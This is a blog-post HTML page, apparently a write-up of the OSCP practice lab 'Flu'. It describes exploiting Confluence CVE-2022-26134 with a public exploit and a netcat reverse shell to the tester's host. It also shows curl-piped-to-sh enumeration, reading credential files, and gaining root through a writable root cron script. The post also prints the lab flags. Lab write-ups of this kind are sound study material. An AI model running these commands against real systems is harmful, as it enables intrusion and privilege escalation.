@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Flu - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Flu This is the first box I can confidently say I did NOT look at a walkthrough for any help on! I&rsquo;ve included one in the details above, but it remained as a background tab the entire way through this - massive confidence boost to know I can do this without needing to follow someone else&rsquo;s footsteps!
+Seeing Confluence when I checked the html port was a big confidence booster too, as I&rsquo;ve worked with it a lot already and knew there were plenty of vulnerabilities and exploit available for older versions. Getting RCE was incredibly simple, and then it was simply a case of enumerating the target to find a privilege escalation vector.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---flu---linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Flu - Linux">
+<meta property="og:description" content="Flu This is the first box I can confidently say I did NOT look at a walkthrough for any help on! I&rsquo;ve included one in the details above, but it remained as a background tab the entire way through this - massive confidence boost to know I can do this without needing to follow someone else&rsquo;s footsteps!
+Seeing Confluence when I checked the html port was a big confidence booster too, as I&rsquo;ve worked with it a lot already and knew there were plenty of vulnerabilities and exploit available for older versions. Getting RCE was incredibly simple, and then it was simply a case of enumerating the target to find a privilege escalation vector.
+" />
+<meta property="og:url" content="/posts/oscp---flu---linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---flu---linux/">OSCP - Flu - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="flu">Flu<a href="#flu" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>This is the first box I can confidently say I did <em><strong>NOT</strong></em> look at a walkthrough for any help on! I&rsquo;ve included one in the details above, but it remained as a background tab the entire way through this - massive confidence boost to know I can do this without needing to follow someone else&rsquo;s footsteps!</p>
+<p>Seeing Confluence when I checked the html port was a big confidence booster too, as I&rsquo;ve worked with it a lot already and knew there were plenty of vulnerabilities and exploit available for older versions. Getting RCE was incredibly simple, and then it was simply a case of enumerating the target to find a privilege escalation vector.</p>
+<p>I&rsquo;m building confidence with <code>pspy</code> too, although I know I need to keep it handier&hellip; and to run it with the timeout command (<code>timeout 20 ./pspy</code>) so it doesn&rsquo;t break my shell! As soon as I ran it and saw the running script I knew that&rsquo;d be the vector I needed, but there was still a lot of uncertainty until I realised it was running every 5 mins - waited a few mins before trying <code>/bin/bash -p</code> again, and got access!</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>22</code> &amp; <code>8080</code></li>
+<li>Visited http (<code>8090</code>) &amp; identified <code>Confluence v7.13.6</code></li>
+<li>Identified exploit for CVE-2022-26134 and ran against target for reverse shell</li>
+<li>Uploaded <code>pspy</code> and identified <code>log-backup.sh</code> being run regularly by <code>root</code></li>
+<li>Added command to change <code>/bin/bash</code> SUID and waited for script to run</li>
+<li>Ran <code>/bin/bash -p</code> to become <code>root</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Linux Priv Escalation</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>python</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oN Flu.nmap 192.168.117.41 -v
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8090/tcp open  opsmessaging?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">302</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-store
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Expires: Thu, <span class="m">01</span> Jan <span class="m">1970</span> 00:00:00 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Confluence-Request-Time: <span class="m">1728796841602</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>D518E2E9A0A5F7BFDA68A6A59D3D9A57<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-XSS-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Security-Policy: frame-ancestors <span class="s1">&#39;self&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Location: http://localhost:8090/login.action?os_destination<span class="o">=</span>%2Findex.action<span class="p">&amp;</span><span class="nv">permissionViolation</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">13</span> Oct <span class="m">2024</span> 05:20:41 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     MS-Author-Via: DAV
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">13</span> Oct <span class="m">2024</span> 05:20:41 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Language: en
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">1924</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">13</span> Oct <span class="m">2024</span> 05:20:41 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span class="m">400</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request&lt;/title&gt;&lt;style <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span>&gt;body <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span><span class="o">}</span> h1, h2, h3, b <span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span> h1 <span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span> h2 <span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span> h3 <span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span> p <span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span> a <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> .line <span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span class="m">400</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Request&lt;/h1&gt;&lt;hr <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;line&#34;</span> /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol <span class="o">[</span>RTSP<span class="p">&amp;</span><span class="c1">#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data.
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-22---ssh-openssh-79p1">Port 22 - SSH (OpenSSH 7.9p1)<a href="#port-22---ssh-openssh-79p1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-8090---http-confluence">Port 8090 - HTTP (Confluence)<a href="#port-8090---http-confluence" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated <code>http://192.168.117.41:8090</code> and identified <code>Confluence 7.13.6</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image1.png" alt="OSCP Flu Linux Image1">
+<ul>
+<li>Potentially vulnerable to CVE-2022-26134</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="cve-2022-26314---ognl-injection">CVE-2022-26314 - OGNL Injection<a href="#cve-2022-26314---ognl-injection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Used <code>searchsploit</code> to identify exploit <code>50952.py</code> for CVE-2022026134. Copied exploit to local host and ran <code>python3 50952.py -u 192.168.117.41:8090 -c id</code> to test output
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image2.png" alt="OSCP Flu Linux Image2"></li>
+<li>Ran exploit again to establish reverse shell <code>python3 50952.py -u 192.168.117.41:8090 -c 'busybox nc 192.168.45.250 4444 -e /bin/sh'</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image3.png" alt="OSCP Flu Linux Image3"></li>
+<li>Ran <code>find / -name local.txt -type f 2&gt;/dev/null</code> to find <code>local.txt</code> then ran <code>cat /home/confluence/local.txt</code> to print <code>edf698cdc0831e7a2fd857ca3ad2191a</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image4.png" alt="OSCP Flu Linux Image4"></li>
+</ul>
+<hr>
+<h1 id="lateral-movement-to-user">Lateral Movement to user<a href="#lateral-movement-to-user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>cat /etc/passwd</code> to identify any other users
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image5.png" alt="OSCP Flu Linux Image5"></li>
+<li>Downloaded &amp; ran <code>suid3num.py</code> to enumerate useful SUID binaries - none found
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image6.png" alt="OSCP Flu Linux Image6">
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image7.png" alt="OSCP Flu Linux Image7"></li>
+<li>Downloaded &amp; ran <code>linpeas.sh</code> with <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code> - nothing obviously useful
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image8.png" alt="OSCP Flu Linux Image8"></li>
+<li>Ran <code>cat /home/confluence/.bash_history</code> to check bash history
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image9.png" alt="OSCP Flu Linux Image9"></li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration-1">Local Enumeration<a href="#local-enumeration-1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Downloaded &amp; ran <code>pspy32</code> - identified <code>/opt/log-backup.sh</code> being run regularly by <code>root</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image10.png" alt="OSCP Flu Linux Image10"></li>
+<li>Ran <code>ls -lah /opt/log-backup.sh</code> to check script privileges
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image11.png" alt="OSCP Flu Linux Image11"></li>
+</ul>
+<h2 id="privilege-escalation-vector">Privilege Escalation vector<a href="#privilege-escalation-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; /opt/log-backup.sh</code> &amp; confirmed written to <code>/opt/log-backup.sh</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image12.png" alt="OSCP Flu Linux Image12"></li>
+<li>Waited several minutes for script, then ran <code>/bin/bash -p</code> for privileged shell as <code>root</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image13.png" alt="OSCP Flu Linux Image13"></li>
+<li>Ran <code>cat /root/proof.txt</code> to print <code>7b793953252334bfadee03b30874aee2</code>
+<img src="/images/OSCP%20-%20Flu%20-%20Linux%20-%20image14.png" alt="OSCP Flu Linux Image14"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>local.txt</code> = <code>edf698cdc0831e7a2fd857ca3ad2191a</code>
+<code>root.txt</code> = <code>7b793953252334bfadee03b30874aee2</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---fired---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Fired - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---htb---active-directory/" class="button inline next">
+         [<span class="button__text">OSCP - HTB - Active Directory</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
